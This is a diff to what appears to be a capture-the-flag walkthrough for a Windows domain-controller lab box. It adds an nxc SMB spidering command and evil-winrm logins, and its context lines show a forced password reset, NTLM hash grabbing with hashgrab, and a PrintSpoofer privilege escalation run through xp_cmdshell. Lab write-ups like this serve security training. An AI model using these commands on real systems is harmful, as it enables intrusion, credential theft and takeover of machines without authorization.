@@ -106,6 +106,10 @@ echo '<your-box-ip> hack.smarter DC01.hack.smarter' | sudo tee -a /etc/hosts
 
 We have anonymous read and write access to the SMB share named 'Share'.
 
+```
+nxc smb 10.0.21.103 -u 'anonymous' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
+```
+
 ![](img/2.png)
 
 We get xct's [hashgrab](https://github.com/xct/hashgrab) to grab NTLM hashes.
@@ -193,7 +197,7 @@ net rpc password "alice.wonderland" "newP@ssword2025" -U "hack.smarter"/"bob.ros
 ```
 
 ```
-evil-winrm -i 10.0.21.103 -u alice.wonderland -p newP@ssword2025
+evil-winrm -i <your-box-ip> -u alice.wonderland -p newP@ssword2025
 ```
 
 ![](img/013.png)
@@ -278,6 +282,10 @@ type do.cmd
 We change the Administrator's password, and login to get the root flag.
 ```
 sqlcmd -S tcp:127.0.0.1,1433 -E -Q "EXEC xp_cmdshell 'C:\ProgramData\PrintSpoofer64.exe -c C:\programdata\do.cmd';"
+```
+
+```
+evil-winrm -i <your-box-ip> -u Administrator -p bluew@shere1
 ```
 
 ![](img/023.png)
